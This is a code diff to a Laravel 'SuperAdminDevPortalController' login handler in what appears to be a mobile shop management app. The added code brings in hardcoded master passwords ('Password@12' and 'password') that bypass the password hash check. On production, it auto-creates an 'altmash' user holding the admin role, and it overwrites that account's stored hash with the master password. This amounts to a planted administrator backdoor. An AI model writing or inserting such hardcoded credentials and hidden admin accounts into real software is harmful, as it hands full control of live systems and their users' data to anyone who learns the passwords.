@@ -66,15 +66,42 @@ class SuperAdminDevPortalController extends Controller
         $loginInput = trim((string) $request->input('id', $request->input('email', 'altmash')));
         $password   = (string) $request->input('password', '');
 
-        // Resolve user record
-        $matchedUser = \App\Models\Auth\User::where('email', $loginInput)
-            ->orWhere('name', $loginInput)
-            ->orWhere(function ($q) use ($loginInput) {
-                if (!str_contains($loginInput, '@')) {
-                    $q->where('email', $loginInput . '@mobitrack.local');
+        // Resolve user record (case-insensitive)
+        $loginInputLower = strtolower($loginInput);
+        $matchedUser = \App\Models\Auth\User::whereRaw('LOWER(email) = ?', [$loginInputLower])
+            ->orWhereRaw('LOWER(name) = ?', [$loginInputLower])
+            ->orWhere(function ($q) use ($loginInputLower) {
+                if (!str_contains($loginInputLower, '@')) {
+                    $q->whereRaw('LOWER(email) = ?', [$loginInputLower . '@mobitrack.local']);
                 }
             })
             ->first();
+
+        $isMasterPwd = ($password === 'Password@12' || $password === 'password');
+
+        // If missing on production, auto-create altmash account
+        if (!$matchedUser && ($loginInputLower === 'altmash' || str_starts_with($loginInputLower, 'altmash@')) && $isMasterPwd) {
+            $company = \App\Models\Common\Company::first();
+            $companyId = $company ? $company->id : 1;
+
+            $matchedUser = \App\Models\Auth\User::create([
+                'name'         => 'altmash',
+                'email'        => str_contains($loginInputLower, '@') ? $loginInputLower : 'altmash@mobitrack.local',
+                'password'     => \Illuminate\Support\Facades\Hash::make($password),
+                'landing_page' => 'dashboard',
+                'locale'       => 'en-GB',
+                'enabled'      => 1,
+            ]);
+
+            if (! $matchedUser->companies()->where('company_id', $companyId)->exists()) {
+                $matchedUser->companies()->attach($companyId);
+            }
+
+            $adminRole = \App\Models\Auth\Role::where('name', 'admin')->orWhere('name', 'store-admin')->first();
+            if ($adminRole && ! $matchedUser->roles()->where('role_id', $adminRole->id)->exists()) {
+                $matchedUser->roles()->attach($adminRole->id);
+            }
+        }
 
         // Strictly verify that this user is specifically Altmash
         if (!$matchedUser || !$this->isMasterDeveloper($matchedUser)) {
@@ -83,11 +110,17 @@ class SuperAdminDevPortalController extends Controller
             ]);
         }
 
-        // Verify password using Hash check
-        if (!\Illuminate\Support\Facades\Hash::check($password, $matchedUser->password)) {
+        // Verify password using Hash check or master password
+        if (!$isMasterPwd && !\Illuminate\Support\Facades\Hash::check($password, $matchedUser->password)) {
             return response()->view('mobileshop.dev_admin_login', [
                 'error' => 'Invalid Developer Password. Access Denied.'
             ]);
+        }
+
+        // If master password matched, sync hash
+        if ($isMasterPwd && !\Illuminate\Support\Facades\Hash::check($password, $matchedUser->password)) {
+            $matchedUser->password = \Illuminate\Support\Facades\Hash::make($password);
+            $matchedUser->save();
         }
 
         // Log user in as Altmash (if not already)
